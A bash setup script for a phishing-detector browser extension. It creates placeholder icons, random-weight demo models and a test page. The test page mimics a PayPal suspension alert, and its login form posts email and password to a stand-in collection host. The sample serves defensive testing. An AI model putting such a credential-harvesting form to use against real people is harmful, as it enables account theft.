#!/bin/bash

# Phishing Detector Pro - Development Setup Script
echo "🛡️ Phishing Detector Pro - Development Setup"
echo "============================================="

# Check if npm is installed
if ! command -v npm &> /dev/null; then
    echo "❌ Error: npm is not installed. Please install Node.js and npm first."
    exit 1
fi

# Install dependencies
echo "📦 Installing dependencies..."
npm install

# Create placeholder icon files (simple colored squares)
echo "🎨 Creating placeholder icons..."
mkdir -p icons

# Create simple placeholder icons using ImageMagick (if available)
if command -v convert &> /dev/null; then
    convert -size 16x16 xc:#1a73e8 icons/icon16.png
    convert -size 32x32 xc:#1a73e8 icons/icon32.png
    convert -size 48x48 xc:#1a73e8 icons/icon48.png
    convert -size 128x128 xc:#1a73e8 icons/icon128.png
    echo "✅ Icons created using ImageMagick"
else
    echo "⚠️  ImageMagick not found. You'll need to add icon files manually:"
    echo "   - icons/icon16.png (16x16)"
    echo "   - icons/icon32.png (32x32)"
    echo "   - icons/icon48.png (48x48)"
    echo "   - icons/icon128.png (128x128)"
fi

# Create model directories
echo "📊 Setting up model directories..."
mkdir -p models/{vrbancic,kaggle,mendeley,huggingface,ieee,phishofe,zenodo}

# Create placeholder model files
echo "🤖 Creating placeholder model configurations..."
for model in vrbancic kaggle mendeley huggingface ieee phishofe zenodo; do
    cat > models/$model/model.json << EOF
{
  "modelTopology": {
    "class_name": "Sequential",
    "config": {
      "name": "sequential_1",
      "layers": [
        {
          "class_name": "Dense",
          "config": {
            "units": 1,
            "activation": "sigmoid",
            "use_bias": true,
            "kernel_initializer": {
              "class_name": "GlorotUniform",
              "config": {"seed": null}
            },
            "bias_initializer": {
              "class_name": "Zeros",
              "config": {}
            },
            "kernel_regularizer": null,
            "bias_regularizer": null,
            "activity_regularizer": null,
            "kernel_constraint": null,
            "bias_constraint": null,
            "name": "dense_1",
            "trainable": true,
            "batch_input_shape": [null, 10],
            "dtype": "float32"
          }
        }
      ]
    }
  },
  "weightsManifest": [
    {
      "paths": ["weights.bin"],
      "weights": [
        {"name": "dense_1/kernel", "shape": [10, 1], "dtype": "float32"},
        {"name": "dense_1/bias", "shape": [1], "dtype": "float32"}
      ]
    }
  ]
}
EOF
    
    # Create random weights file (binary)
    python3 -c "
import numpy as np
import struct

# Generate random weights for demo
kernel = np.random.randn(10, 1).astype(np.float32)
bias = np.random.randn(1).astype(np.float32)

with open('models/$model/weights.bin', 'wb') as f:
    f.write(kernel.tobytes())
    f.write(bias.tobytes())
"
done

echo "✅ Placeholder models created"

# Copy TensorFlow.js if available
if [ -d "node_modules/@tensorflow/tfjs/dist" ]; then
    echo "📚 Copying TensorFlow.js..."
    cp node_modules/@tensorflow/tfjs/dist/tf.min.js assets/ 2>/dev/null || echo "⚠️  Could not copy TensorFlow.js - will load from CDN"
fi

# Create a simple test HTML file
echo "🧪 Creating test page..."
cat > test-phishing-page.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Test Phishing Page - DO NOT USE IN PRODUCTION</title>
</head>
<body>
    <h1>PayPal Security Alert</h1>
    <p>Your account has been suspended. Please verify your identity immediately.</p>
    <form action="http://suspicious-domain.tk/collect.php" method="post">
        <input type="text" placeholder="Email" name="email" required>
        <input type="password" placeholder="Password" name="password" required>
        <button type="submit">Verify Account</button>
    </form>
    <p><strong>Note:</strong> This is a test page for the phishing detector extension.</p>
</body>
</html>
EOF

echo ""
echo "🎉 Setup Complete!"
echo "=================="
echo ""
echo "Next steps:"
echo "1. Open Chrome and go to chrome://extensions/"
echo "2. Enable 'Developer mode'"
echo "3. Click 'Load unpacked' and select this directory"
echo "4. Test with the included test-phishing-page.html"
echo "5. Configure API keys in the extension settings"
echo ""
echo "📖 For detailed instructions, see SETUP.md"
echo "🔧 For development info, see README.md"
echo ""
echo "⚠️  Remember to add real AI models and icons for production use!"
